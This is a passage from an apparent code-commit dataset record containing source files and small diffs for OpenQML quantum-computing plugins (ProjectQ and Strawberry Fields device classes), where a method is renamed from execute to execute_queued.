gate_name not in self._gates: raise ValueError('Gate{} not supported on this backend'.format(gate)) gate=operator_map[gate_name](*par) if isinstance(wires, int): gate | self.reg[wires] else: gate | tuple([self.reg[i] for i in wires]) def expectation(self, observable, wires): raise NotImplementedError(\"expectation() is not yet implemented for this backend\") def shutdown(self): \"\"\"Shutdown. \"\"\" pass def _deallocate(self): \"\"\"Deallocate all qubits to make ProjectQ happy See also: https://github.com/ProjectQ-Framework/ProjectQ/issues/2 Drawback: This is probably rather resource intensive. \"\"\" if self.eng is not None and self.backend=='Simulator' or self.backend=='IBMBackend': pq.ops.All(pq.ops.Measure) | self.reg def _deallocate2(self): \"\"\"Another proposal for how to deallocate all qubits to make ProjectQ happy Unsuitable because: Produces a segmentation fault. \"\"\" if self.eng is not None and self.backend=='Simulator' or self.backend=='IBMBackend': for qubit in self.reg: self.eng.deallocate_qubit(qubit) def _deallocate3(self): \"\"\"Another proposal for how to deallocate all qubits to make ProjectQ happy Unsuitable because: Throws an error if the probability for the given collapse is 0. \"\"\" if self.eng is not None and self.backend=='Simulator' or self.backend=='IBMBackend': self.eng.flush() self.eng.backend.collapse_wavefunction(self.reg,[0 for i in range(len(self.reg))]) def filter_kwargs_for_backend(self, kwargs): return{ key:value for key,value in kwargs.items() if key in self._backend_kwargs} class ProjectQSimulator(ProjectQDevice): \"\"\"ProjectQ Simulator device for OpenQML. Args: wires(int): The number of qubits of the device. Keyword Args: gate_fusion(bool): If True, gates are cached and only executed once a certain gate-size has been reached(only has an effect for the c++simulator). rnd_seed(int): Random seed(uses random.randint(0, 4294967295) by default). \"\"\" short_name='projectq.simulator' _gates=set(operator_map.keys()) _observables=set([ key for(key,val) in operator_map.items() if val in[XGate, YGate, ZGate, AllZGate, Hermitian]]) _circuits={} _backend_kwargs=['gate_fusion', 'rnd_seed'] def __init__(self, wires, **kwargs): kwargs['backend']='Simulator' super().__init__(wires, **kwargs) def reset(self): \"\"\"Resets the engine and backend After the reset the Device should be as if it was just constructed. Most importantly the quantum state is reset to its initial value. \"\"\" backend=pq.backends.Simulator(**self.filter_kwargs_for_backend(self.kwargs)) self.eng=pq.MainEngine(backend) super().reset() def expectation(self, observable, wires): self.eng.flush(deallocate_qubits=False) if observable=='PauliX' or observable=='PauliY' or observable=='PauliZ': expectation_value=self.eng.backend.get_expectation_value(pq.ops.QubitOperator(str(observable)[-1]+'0'), self.reg) variance=1 -expectation_value**2 elif observable=='AllPauliZ': expectation_value=[ self.eng.backend.get_expectation_value(pq.ops.QubitOperator(\"Z\"+'0'),[qubit]) for qubit in self.reg] variance=[1 -e**2 for e in expectation_value] else: raise NotImplementedError(\"Estimation of expectation values not yet implemented for the observable{} in backend{}.\".format(observable, self.backend)) return expectation_value class ProjectQClassicalSimulator(ProjectQDevice): \"\"\"ProjectQ ClassicalSimulator device for OpenQML. Args: wires(int): The number of qubits of the device. \"\"\" short_name='projectq.classicalsimulator' _gates=set([ key for(key,val) in operator_map.items() if val in[XGate, CNOT]]) _observables=set([ key for(key,val) in operator_map.items() if val in[ZGate, AllZGate]]) _circuits={} _backend_kwargs=[] def __init__(self, wires, **kwargs): kwargs['backend']='ClassicalSimulator' super().__init__(wires, **kwargs) def reset(self): \"\"\"Resets the engine and backend After the reset the Device should be as if it was just constructed. Most importantly the quantum state is reset to its initial value. \"\"\" backend=pq.backends.ClassicalSimulator(**self.filter_kwargs_for_backend(self.kwargs)) self.eng=pq.MainEngine(backend) super().reset() class ProjectQIBMBackend(ProjectQDevice): \"\"\"ProjectQ IBMBackend device for OpenQML. Args: wires(int): The number of qubits of the device. Keyword Args: use_hardware(bool): If True, the code is run on the IBM quantum chip(instead of using the IBM simulator) num_runs(int): Number of runs to collect statistics.(default is 1024) verbose(bool): If True, statistics are printed, in addition to the measurement result being registered(at the end of the circuit). user(string): IBM Quantum Experience user name password(string): IBM Quantum Experience password device(string): Device to use(\u2018ibmqx4\u2019, or \u2018ibmqx5\u2019) if use_hardware is set to True. Default is ibmqx4. retrieve_execution(int): Job ID to retrieve instead of re-running the circuit(e.g., if previous run timed out). \"\"\" short_name='projectq.ibmbackend' _gates=set([ key for(key,val) in operator_map.items() if val in[HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, Rx, Ry, Rz, R, CNOT, CZ]]) _observables=set([ key for(key,val) in operator_map.items() if val in[ZGate, AllZGate]]) _circuits={} _backend_kwargs=['use_hardware', 'num_runs', 'verbose', 'user', 'password', 'device', 'retrieve_execution'] def __init__(self, wires, **kwargs): if 'user' not in kwargs: raise ValueError('An IBM Quantum Experience user name specified via the \"user\" keyword argument is required') if 'password' not in kwargs: raise ValueError('An IBM Quantum Experience password specified via the \"password\" keyword argument is required') kwargs['backend']='IBMBackend' super().__init__(wires, **kwargs) def reset(self): \"\"\"Resets the engine and backend After the reset the Device should be as if it was just constructed. Most importantly the quantum state is reset to its initial value. \"\"\" backend=pq.backends.IBMBackend(**self.filter_kwargs_for_backend(self.kwargs)) self.eng=pq.MainEngine(backend, engine_list=pq.setups.ibm.get_engine_list()) super().reset() def expectation(self, observable, wires): pq.ops.R(0) | self.reg[0] pq.ops.All(pq.ops.Measure) | self.reg self.eng.flush() if observable=='PauliZ': probabilities=self.eng.backend.get_probabilities([self.reg[wires]]) if '1' in probabilities: expectation_value=2*probabilities['1']-1 else: expectation_value=-(2*probabilities['0']-1) variance=1 -expectation_value**2 elif observable=='AllPauliZ': probabilities=self.eng.backend.get_probabilities(self.reg) expectation_value=[((2*sum(p for(state,p) in probabilities.items() if state[i]=='1')-1)-(2*sum(p for(state,p) in probabilities.items() if state[i]=='0')-1)) for i in range(len(self.reg))] variance=[1 -e**2 for e in expectation_value] else: raise NotImplementedError(\"Estimation of expectation values not yet implemented for the observable{} in backend{}.\".format(observable, self.backend)) return expectation_value ", "sourceWithComments": "# Copyright 2018 Xanadu Quantum Technologies Inc.\n\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n\n#     http://www.apache.org/licenses/LICENSE-2.0\n\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nr\"\"\"\nProjectQ plugin\n========================\n\n**Module name:** :mod:`openqml.plugins.projectq`\n\n.. currentmodule:: openqml.plugins.projectq\n\nThis plugin provides the interface between OpenQML and ProjecQ.\nIt enables OpenQML to optimize quantum circuits simulable with ProjectQ.\n\nProjecQ supports several different backends. Of those, the following are useful in the current context:\n\n- projectq.backends.Simulator([gate_fusion, ...])\tSimulator is a compiler engine which simulates a quantum computer using C++-based kernels.\n- projectq.backends.ClassicalSimulator()\t        A simple introspective simulator that only permits classical operations.\n- projectq.backends.IBMBackend([use_hardware, ...])\tThe IBM Backend class, which stores the circuit, transforms it to JSON QASM, and sends the circuit through the IBM API.\n\nSee PluginAPI._capabilities['backend'] for a list of backend options.\n\nFunctions\n---------\n\n.. autosummary::\n   init_plugin\n\nClasses\n-------\n\n.. autosummary::\n   Gate\n   Observable\n   PluginAPI\n\n----\n\"\"\"\nimport logging as log\nimport numpy as np\nfrom numpy.random import (randn,)\nfrom openqml import Device, DeviceError\nfrom openqml import Variable\n\nimport projectq as pq\nimport projectq.setups.ibm #todo only import this if necessary\n\n# import operations\nfrom projectq.ops import (HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, SqrtSwapGate, Rx, Ry, Rz, R)\nfrom .ops import (CNOT, CZ, Toffoli, AllZGate, Rot, Hermitian)\n\nfrom ._version import __version__\n\n\noperator_map = {\n    'PauliX': XGate,\n    'PauliY': YGate,\n    'PauliZ': ZGate,\n    'CNOT': CNOT,\n    'CZ': CZ,\n    'SWAP': SwapGate,\n    'RX': Rx,\n    'RY': Ry,\n    'RZ': Rz,\n    'Rot': Rot,\n    #'PhaseShift': #todo: implement\n    #'QubitStateVector': #todo: implement\n    #'QubitUnitary': #todo: implement\n    #: H, #todo: implement\n    #: S, #todo: implement\n    #: T, #todo: implement\n    #: SqrtX, #todo: implement\n    #: SqrtSwap, #todo: implement\n    #: R, #todo: implement\n    #'AllPauliZ': AllZGate, #todo: implement\n    #'Hermitian': #todo: implement\n}\n\nclass ProjectQDevice(Device):\n    \"\"\"ProjectQ device for OpenQML.\n\n    Args:\n       wires (int): The number of qubits of the device.\n\n    Keyword Args for Simulator backend:\n      gate_fusion (bool): If True, gates are cached and only executed once a certain gate-size has been reached (only has an effect for the c++ simulator).\n      rnd_seed (int): Random seed (uses random.randint(0, 4294967295) by default).\n\n    Keyword Args for IBMBackend backend:\n      use_hardware (bool): If True, the code is run on the IBM quantum chip (instead of using the IBM simulator)\n      num_runs (int): Number of runs to collect statistics. (default is 1024)\n      verbose (bool): If True, statistics are printed, in addition to the measurement result being registered (at the end of the circuit).\n      user (string): IBM Quantum Experience user name\n      password (string): IBM Quantum Experience password\n      device (string): Device to use (\u2018ibmqx4\u2019, or \u2018ibmqx5\u2019) if use_hardware is set to True. Default is ibmqx4.\n      retrieve_execution (int): Job ID to retrieve instead of re-running the circuit (e.g., if previous run timed out).\n    \"\"\"\n    name = 'ProjectQ OpenQML plugin'\n    short_name = 'projectq'\n    api_version = '0.1.0'\n    plugin_version = __version__\n    author = 'Christian Gogolin'\n    _capabilities = {'backend': list([\"Simulator\", \"ClassicalSimulator\", \"IBMBackend\"])}\n\n    def __init__(self, wires, **kwargs):\n        kwargs.setdefault('shots', 0)\n        super().__init__(self.short_name, kwargs['shots'])\n\n        # translate some aguments\n        for k,v in {'log':'verbose'}.items():\n            if k in kwargs:\n                kwargs.setdefault(v, kwargs[k])\n\n        # clean some arguments\n        if 'num_runs' in kwargs:\n            if isinstance(kwargs['num_runs'], int) and kwargs['num_runs']>0:\n                self.n_eval = kwargs['num_runs']\n            else:\n                self.n_eval = 0\n                del(kwargs['num_runs'])\n\n        self.wires = wires\n        self.backend = kwargs['backend']\n        del(kwargs['backend'])\n        self.kwargs = kwargs\n        self.eng = None\n        self.reg = None\n        #self.reset() #the actual initialization is done in reset(), but we don't need to call this manually as Device does it for us during __enter__()\n\n    def reset(self):\n        self.reg = self.eng.allocate_qureg(self.wires)\n\n    def __repr__(self):\n        return super().__repr__() +'Backend: ' +self.backend +'\\n'\n\n    def __str__(self):\n        return super().__str__() +'Backend: ' +self.backend +'\\n'\n\n    # def __del__(self):\n    #     self._deallocate()\n\n    def execute(self):\n        \"\"\" \"\"\"\n        #todo: I hope this function will become superfluous, see https://github.com/XanaduAI/openqml/issues/18\n        self._out = self.execute_queued()\n\n    def execute_queued(self):\n        \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n        #expectation_values = {}\n        for operation in self._queue:\n            if operation.name not in operator_map:\n                raise DeviceError(\"{} not supported by device {}\".format(operation.name, self.short_name))\n\n            par = [x.val if isinstance(x, Variable) else x for x in operation.params]\n            #expectation_values[tuple(operation.wires)] = self.apply(operator_map[operation.name](*p), self.reg, operation.wires)\n            self.apply(operation.name, operation.wires, *par)\n\n        result = self.expectation(self._observe.name, self._observe.wires)\n        self._deallocate()\n        return result\n\n        # if self._observe.wires is not None:\n        #     if isinstance(self._observe.wires, int):\n        #         return expectation_values[tuple([self._observe.wires])]\n        #     else:\n        #         return np.array([expectation_values[tuple([idx])] for idx in self._observe.wires if tuple([idx]) in expectation_values])\n\n    def apply(self, gate_name, wires, *par):\n        if gate_name not in self._gates:\n            raise ValueError('Gate {} not supported on this backend'.format(gate))\n\n        gate = operator_map[gate_name](*par)\n        if isinstance(wires, int):\n            gate | self.reg[wires]\n        else:\n            gate | tuple([self.reg[i] for i in wires])\n\n    def expectation(self, observable, wires):\n        raise NotImplementedError(\"expectation() is not yet implemented for this backend\")\n\n    def shutdown(self):\n        \"\"\"Shutdown.\n\n        \"\"\"\n        pass\n\n    def _deallocate(self):\n        \"\"\"Deallocate all qubits to make ProjectQ happy\n\n        See also: https://github.com/ProjectQ-Framework/ProjectQ/issues/2\n\n        Drawback: This is probably rather resource intensive.\n        \"\"\"\n        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':\n            pq.ops.All(pq.ops.Measure) | self.reg #avoid an unfriendly error message: https://github.com/ProjectQ-Framework/ProjectQ/issues/2\n\n    def _deallocate2(self):\n        \"\"\"Another proposal for how to deallocate all qubits to make ProjectQ happy\n\n        Unsuitable because: Produces a segmentation fault.\n        \"\"\"\n        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':\n             for qubit in self.reg:\n                 self.eng.deallocate_qubit(qubit)\n\n    def _deallocate3(self):\n        \"\"\"Another proposal for how to deallocate all qubits to make ProjectQ happy\n\n        Unsuitable because: Throws an error if the probability for the given collapse is 0.\n        \"\"\"\n        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':\n            self.eng.flush()\n            self.eng.backend.collapse_wavefunction(self.reg, [0 for i in range(len(self.reg))])\n\n\n    # def requires_credentials(self):\n    #     \"\"\"Check whether this plugin requires credentials\n    #     \"\"\"\n    #     if self.backend == 'IBMBackend':\n    #         return True\n    #     else:\n    #         return False\n\n\n    def filter_kwargs_for_backend(self, kwargs):\n        return { key:value for key,value in kwargs.items() if key in self._backend_kwargs }\n\n\nclass ProjectQSimulator(ProjectQDevice):\n    \"\"\"ProjectQ Simulator device for OpenQML.\n\n    Args:\n       wires (int): The number of qubits of the device.\n\n    Keyword Args:\n      gate_fusion (bool): If True, gates are cached and only executed once a certain gate-size has been reached (only has an effect for the c++ simulator).\n      rnd_seed (int): Random seed (uses random.randint(0, 4294967295) by default).\n    \"\"\"\n\n    short_name = 'projectq.simulator'\n    _gates = set(operator_map.keys())\n    _observables = set([ key for (key,val) in operator_map.items() if val in [XGate, YGate, ZGate, AllZGate, Hermitian] ])\n    _circuits = {}\n    _backend_kwargs = ['gate_fusion', 'rnd_seed']\n\n    def __init__(self, wires, **kwargs):\n        kwargs['backend'] = 'Simulator'\n        super().__init__(wires, **kwargs)\n\n    def reset(self):\n        \"\"\"Resets the engine and backend\n\n        After the reset the Device should be as if it was just constructed.\n        Most importantly the quantum state is reset to its initial value.\n        \"\"\"\n        backend = pq.backends.Simulator(**self.filter_kwargs_for_backend(self.kwargs))\n        self.eng = pq.MainEngine(backend)\n        super().reset()\n\n\n    def expectation(self, observable, wires):\n        self.eng.flush(deallocate_qubits=False)\n        if observable == 'PauliX' or observable == 'PauliY' or observable == 'PauliZ':\n            expectation_value = self.eng.backend.get_expectation_value(pq.ops.QubitOperator(str(observable)[-1]+'0'), self.reg)\n            variance = 1 - expectation_value**2\n        elif observable == 'AllPauliZ':\n            expectation_value = [ self.eng.backend.get_expectation_value(pq.ops.QubitOperator(\"Z\"+'0'), [qubit]) for qubit in self.reg]\n            variance = [1 - e**2 for e in expectation_value]\n        else:\n            raise NotImplementedError(\"Estimation of expectation values not yet implemented for the observable {} in backend {}.\".format(observable, self.backend))\n\n        return expectation_value#, variance\n\n\nclass ProjectQClassicalSimulator(ProjectQDevice):\n    \"\"\"ProjectQ ClassicalSimulator device for OpenQML.\n\n    Args:\n       wires (int): The number of qubits of the device.\n    \"\"\"\n\n    short_name = 'projectq.classicalsimulator'\n    _gates = set([ key for (key,val) in operator_map.items() if val in [XGate, CNOT] ])\n    _observables = set([ key for (key,val) in operator_map.items() if val in [ZGate, AllZGate] ])\n    _circuits = {}\n    _backend_kwargs = []\n\n    def __init__(self, wires, **kwargs):\n        kwargs['backend'] = 'ClassicalSimulator'\n        super().__init__(wires, **kwargs)\n\n    def reset(self):\n        \"\"\"Resets the engine and backend\n\n        After the reset the Device should be as if it was just constructed.\n        Most importantly the quantum state is reset to its initial value.\n        \"\"\"\n        backend = pq.backends.ClassicalSimulator(**self.filter_kwargs_for_backend(self.kwargs))\n        self.eng = pq.MainEngine(backend)\n        super().reset()\n\nclass ProjectQIBMBackend(ProjectQDevice):\n    \"\"\"ProjectQ IBMBackend device for OpenQML.\n\n    Args:\n       wires (int): The number of qubits of the device.\n\n    Keyword Args:\n      use_hardware (bool): If True, the code is run on the IBM quantum chip (instead of using the IBM simulator)\n      num_runs (int): Number of runs to collect statistics. (default is 1024)\n      verbose (bool): If True, statistics are printed, in addition to the measurement result being registered (at the end of the circuit).\n      user (string): IBM Quantum Experience user name\n      password (string): IBM Quantum Experience password\n      device (string): Device to use (\u2018ibmqx4\u2019, or \u2018ibmqx5\u2019) if use_hardware is set to True. Default is ibmqx4.\n      retrieve_execution (int): Job ID to retrieve instead of re-running the circuit (e.g., if previous run timed out).\n    \"\"\"\n\n    short_name = 'projectq.ibmbackend'\n    _gates = set([ key for (key,val) in operator_map.items() if val in [HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, Rx, Ry, Rz, R, CNOT, CZ] ])\n    _observables = set([ key for (key,val) in operator_map.items() if val in [ZGate, AllZGate] ])\n    _circuits = {}\n    _backend_kwargs = ['use_hardware', 'num_runs', 'verbose', 'user', 'password', 'device', 'retrieve_execution']\n\n    def __init__(self, wires, **kwargs):\n        # check that necessary arguments are given\n        if 'user' not in kwargs:\n            raise ValueError('An IBM Quantum Experience user name specified via the \"user\" keyword argument is required')\n        if 'password' not in kwargs:\n            raise ValueError('An IBM Quantum Experience password specified via the \"password\" keyword argument is required')\n\n        kwargs['backend'] = 'IBMBackend'\n        #kwargs['verbose'] = True #todo: remove when done testing\n        #kwargs['log'] = True #todo: remove when done testing\n        #kwargs['use_hardware'] = False #todo: remove when done testing\n        #kwargs['num_runs'] = 3 #todo: remove when done testing\n        super().__init__(wires, **kwargs)\n\n    def reset(self):\n        \"\"\"Resets the engine and backend\n\n        After the reset the Device should be as if it was just constructed.\n        Most importantly the quantum state is reset to its initial value.\n        \"\"\"\n        backend = pq.backends.IBMBackend(**self.filter_kwargs_for_backend(self.kwargs))\n        self.eng = pq.MainEngine(backend, engine_list=pq.setups.ibm.get_engine_list())\n        super().reset()\n\n    def expectation(self, observable, wires):\n        pq.ops.R(0) | self.reg[0]# todo:remove this once https://github.com/ProjectQ-Framework/ProjectQ/issues/259 is resolved\n\n        pq.ops.All(pq.ops.Measure) | self.reg\n        self.eng.flush()\n\n        if observable == 'PauliZ':\n            probabilities = self.eng.backend.get_probabilities([self.reg[wires]])\n            #print(\"IBM probabilities=\"+str(probabilities))\n            if '1' in probabilities:\n                expectation_value = 2*probabilities['1']-1\n            else:\n                expectation_value = -(2*probabilities['0']-1)\n            variance = 1 - expectation_value**2\n        elif observable == 'AllPauliZ':\n            probabilities = self.eng.backend.get_probabilities(self.reg)\n            #print(\"IBM all probabilities=\"+str(probabilities))\n            expectation_value = [ ((2*sum(p for (state,p) in probabilities.items() if state[i] == '1')-1)-(2*sum(p for (state,p) in probabilities.items() if state[i] == '0')-1)) for i in range(len(self.reg)) ]\n            variance = [1 - e**2 for e in expectation_value]\n        else:\n            raise NotImplementedError(\"Estimation of expectation values not yet implemented for the observable {} in backend {}.\".format(observable, self.backend))\n\n        return expectation_value#, variance\n"}, "/openqml-sf/openqml_sf/fock.py": {"changes": [{"diff": "\n         self.state = None\n         super().__init__(self.short_name, shots)\n \n-    def execute(self):\n+    def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         if self.eng:\n             self.eng.reset(", "add": 1, "remove": 1, "filename": "/openqml-sf/openqml_sf/fock.py", "badparts": ["    def execute(self):"], "goodparts": ["    def execute_queued(self):"]}], "source": "\n \"\"\"This module contains the device class and context manager\"\"\" import numpy as np from openqml import Device, DeviceError from openqml import Variable import strawberryfields as sf from strawberryfields.ops import(Catstate, Coherent, DensityMatrix, DisplacedSqueezed, Fock, Ket, Squeezed, Thermal, Gaussian) from strawberryfields.ops import(GaussianTransform, Interferometer) from strawberryfields.ops import(BSgate, CKgate, CXgate, CZgate, Dgate, Fouriergate, Kgate, Pgate, Rgate, S2gate, Sgate, Vgate, Xgate, Zgate) from strawberryfields.ops import(MeasureFock, MeasureHeterodyne, MeasureHomodyne) from._version import __version__ operator_map={ 'CatState:': Catstate, 'CoherentState': Coherent, 'FockDensityMatrix': DensityMatrix, 'DisplacedSqueezed': DisplacedSqueezed, 'FockState': Fock, 'FockStateVector': Ket, 'SqueezedState': Squeezed, 'ThermalState': Thermal, 'GaussianState': Gaussian, 'Beamsplitter': BSgate, 'CrossKerr': CKgate, 'ControlledAddition': CXgate, 'ControlledPhase': CZgate, 'Displacement': Dgate, 'Kerr': Kgate, 'QuadraticPhase': Pgate, 'Rotation': Rgate, 'TwoModeSqueezing': S2gate, 'Squeezing': Sgate, 'CubicPhase': Vgate, } class StrawberryFieldsFock(Device): \"\"\"StrawberryFields Fock device for OpenQML. wires(int): the number of modes to initialize the device in. cutoff(int): the Fock space truncation. Must be specified before applying a qfunc. hbar(float): the convention chosen in the canonical commutation relation[x, p]=i hbar. The default value is hbar=2. \"\"\" name='Strawberry Fields OpenQML plugin' short_name='strawberryfields.fock' api_version='0.1.0' version=__version__ author='Josh Izaac' _gates=set(operator_map.keys()) _observables={'Fock', 'X', 'P', 'Homodyne'} _circuits={} def __init__(self, wires, *, shots=0, cutoff=None, hbar=2): self.wires=wires self.cutoff=cutoff self.hbar=hbar self.eng=None self.state=None super().__init__(self.short_name, shots) def execute(self): \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\" if self.eng: self.eng.reset() self.reset() self.eng, q=sf.Engine(self.wires, hbar=self.hbar) with self.eng: for operation in self._queue: if operation.name not in operator_map: raise DeviceError(\"{} not supported by device{}\".format(operation.name, self.short_name)) p=[x.val if isinstance(x, Variable) else x for x in operation.params] op=operator_map[operation.name](*p) if isinstance(operation.wires, int): op | q[operation.wires] else: op |[q[i] for i in operation.wires] self.state=self.eng.run('fock', cutoff_dim=self.cutoff) reg=self._observe.wires if self._observe.name=='Fock': ex=self.state.mean_photon(reg) var=0 elif self._observe.name=='X': ex, var=self.state.quad_expectation(reg, 0) elif self._observe.name=='P': ex, var=self.state.quad_expectation(reg, np.pi/2) elif self._observe.name=='Homodyne': ex, var=self.state.quad_expectation(reg, *self.observe.params) if self.shots !=0: ex=np.random.normal(ex, np.sqrt(var / self.shots)) self._out=ex def reset(self): \"\"\"Reset the device\"\"\" if self.eng is not None: self.eng=None self.state=None ", "sourceWithComments": "# Copyright 2018 Xanadu Quantum Technologies Inc.\n\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n\n#     http://www.apache.org/licenses/LICENSE-2.0\n\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"This module contains the device class and context manager\"\"\"\nimport numpy as np\nfrom openqml import Device, DeviceError\nfrom openqml import Variable\n\nimport strawberryfields as sf\n\n#import state preparations\nfrom strawberryfields.ops import (Catstate, Coherent, DensityMatrix, DisplacedSqueezed,\n                                  Fock, Ket, Squeezed, Thermal, Gaussian)\n# import decompositions\nfrom strawberryfields.ops import (GaussianTransform, Interferometer)\n# import gates\nfrom strawberryfields.ops import (BSgate, CKgate, CXgate, CZgate, Dgate, Fouriergate,\n                                  Kgate, Pgate, Rgate, S2gate, Sgate, Vgate, Xgate, Zgate)\n# import measurements\nfrom strawberryfields.ops import (MeasureFock, MeasureHeterodyne, MeasureHomodyne)\n\n\nfrom ._version import __version__\n\n\noperator_map = {\n    'CatState:': Catstate,\n    'CoherentState': Coherent,\n    'FockDensityMatrix': DensityMatrix,\n    'DisplacedSqueezed': DisplacedSqueezed,\n    'FockState': Fock,\n    'FockStateVector': Ket,\n    'SqueezedState': Squeezed,\n    'ThermalState': Thermal,\n    'GaussianState': Gaussian,\n    'Beamsplitter': BSgate,\n    'CrossKerr': CKgate,\n    'ControlledAddition': CXgate,\n    'ControlledPhase': CZgate,\n    'Displacement': Dgate,\n    'Kerr': Kgate,\n    'QuadraticPhase': Pgate,\n    'Rotation': Rgate,\n    'TwoModeSqueezing': S2gate,\n    'Squeezing': Sgate,\n    'CubicPhase': Vgate,\n    # 'XDisplacement': Xgate,\n    # 'PDisplacement': Zgate,\n    # 'MeasureFock': MeasureFock,\n    # 'MeasureHomodyne': MeasureHomodyne\n}\n\n\nclass StrawberryFieldsFock(Device):\n    \"\"\"StrawberryFields Fock device for OpenQML.\n\n    wires (int): the number of modes to initialize the device in.\n    cutoff (int): the Fock space truncation. Must be specified before\n        applying a qfunc.\n    hbar (float): the convention chosen in the canonical commutation\n        relation [x, p] = i hbar. The default value is hbar=2.\n    \"\"\"\n    name = 'Strawberry Fields OpenQML plugin'\n    short_name = 'strawberryfields.fock'\n    api_version = '0.1.0'\n    version = __version__\n    author = 'Josh Izaac'\n    _gates = set(operator_map.keys())\n    _observables = {'Fock', 'X', 'P', 'Homodyne'}\n    _circuits = {}\n\n    def __init__(self, wires, *, shots=0, cutoff=None, hbar=2):\n        self.wires = wires\n        self.cutoff = cutoff\n        self.hbar = hbar\n        self.eng = None\n        self.state = None\n        super().__init__(self.short_name, shots)\n\n    def execute(self):\n        \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n        if self.eng:\n            self.eng.reset()\n            self.reset()\n\n        self.eng, q = sf.Engine(self.wires, hbar=self.hbar)\n\n        with self.eng:\n            for operation in self._queue:\n                if operation.name not in operator_map:\n                    raise DeviceError(\"{} not supported by device {}\".format(operation.name, self.short_name))\n\n                p = [x.val if isinstance(x, Variable) else x for x in operation.params]\n                op = operator_map[operation.name](*p)\n                if isinstance(operation.wires, int):\n                    op | q[operation.wires]\n                else:\n                    op | [q[i] for i in operation.wires]\n\n        self.state = self.eng.run('fock', cutoff_dim=self.cutoff)\n\n        # calculate expectation value\n        reg = self._observe.wires\n        if self._observe.name == 'Fock':\n            ex = self.state.mean_photon(reg)\n            var = 0\n        elif self._observe.name == 'X':\n            ex, var = self.state.quad_expectation(reg, 0)\n        elif self._observe.name == 'P':\n            ex, var = self.state.quad_expectation(reg, np.pi/2)\n        elif self._observe.name == 'Homodyne':\n            ex, var = self.state.quad_expectation(reg, *self.observe.params)\n\n        if self.shots != 0:\n            # estimate the expectation value\n            # use central limit theorem, sample normal distribution once, only ok\n            # if shots is large (see https://en.wikipedia.org/wiki/Berry%E2%80%93Esseen_theorem)\n            ex = np.random.normal(ex, np.sqrt(var / self.shots))\n\n        self._out = ex\n\n    def reset(self):\n        \"\"\"Reset the device\"\"\"\n        if self.eng is not None:\n            self.eng = None\n            self.state = None\n"}, "/openqml-sf/openqml_sf/gaussian.py": {"changes": [{"diff": "\n         self.state = None\n         super().__init__(self.short_name, shots)\n \n-    def execute(self):\n+    def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         if self.eng:\n             self.eng.reset", "add": 1, "remove": 1, "filename": "/openqml-sf/openqml_sf/gaussian.py", "badparts": ["    def execute(self):"], "goodparts": ["    def execute_queued(self):"]}], "source": "\n \"\"\"This module contains the device class and context manager\"\"\" import numpy as np from openqml import Device, DeviceError from openqml import Variable import strawberryfields as sf from strawberryfields.ops import(Catstate, Coherent, DensityMatrix, DisplacedSqueezed, Fock, Ket, Squeezed, Thermal, Gaussian) from strawberryfields.ops import(GaussianTransform, Interferometer) from strawberryfields.ops import(BSgate, CKgate, CXgate, CZgate, Dgate, Fouriergate, Kgate, Pgate, Rgate, S2gate, Sgate, Vgate, Xgate, Zgate) from strawberryfields.ops import(MeasureFock, MeasureHeterodyne, MeasureHomodyne) from._version import __version__ operator_map={ 'CoherentState': Coherent, 'DisplacedSqueezed': DisplacedSqueezed, 'SqueezedState': Squeezed, 'ThermalState': Thermal, 'GaussianState': Gaussian, 'Beamsplitter': BSgate, 'ControlledAddition': CXgate, 'ControlledPhase': CZgate, 'Displacement': Dgate, 'QuadraticPhase': Pgate, 'Rotation': Rgate, 'TwoModeSqueezing': S2gate, 'Squeeze': Sgate, } class StrawberryFieldsGaussian(Device): \"\"\"StrawberryFields Gaussian device for OpenQML. wires(int): the number of modes to initialize the device in. hbar(float): the convention chosen in the canonical commutation relation[x, p]=i hbar. The default value is hbar=2. \"\"\" name='Strawberry Fields OpenQML plugin' short_name='strawberryfields.fock' api_version='0.1.0' version=__version__ author='Josh Izaac' _gates=set(operator_map.keys()) _observables={'Fock', 'X', 'P', 'Homodyne', 'Heterodyne'} _circuits={} def __init__(self, wires, *, shots=0, hbar=2): self.wires=wires self.hbar=hbar self.eng=None self.state=None super().__init__(self.short_name, shots) def execute(self): \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\" if self.eng: self.eng.reset() self.reset() self.eng, q=sf.Engine(self.wires, hbar=self.hbar) with self.eng: for operation in self._queue: if operation.name not in operator_map: raise DeviceError(\"{} not supported by device{}\".format(operation.name, self.short_name)) p=[x.val if isinstance(x, Variable) else x for x in operation.params] op=operator_map[operation.name](*p) if isinstance(operation.wires, int): op | q[operation.wires] else: op |[q[i] for i in operation.wires] self.state=self.eng.run('gaussian') reg=self._observe.wires if self._observe.name=='Fock': ex=self.state.mean_photon(reg) var=0 elif self._observe.name=='X': ex, var=self.state.quad_expectation(reg, 0) elif self._observe.name=='P': ex, var=self.state.quad_expectation(reg, np.pi/2) elif self._observe.name=='Homodyne': ex, var=self.state.quad_expectation(reg, *self._observe.params) elif self._observe.name=='Displacement': ex=self.state.displacement(modes=reg) if self.shots !=0: ex=np.random.normal(ex, np.sqrt(var / self.shots)) self._out=ex def reset(self): \"\"\"Reset the device\"\"\" if self.eng is not None: self.eng=None self.state=None ", "sourceWithComments": "# Copyright 2018 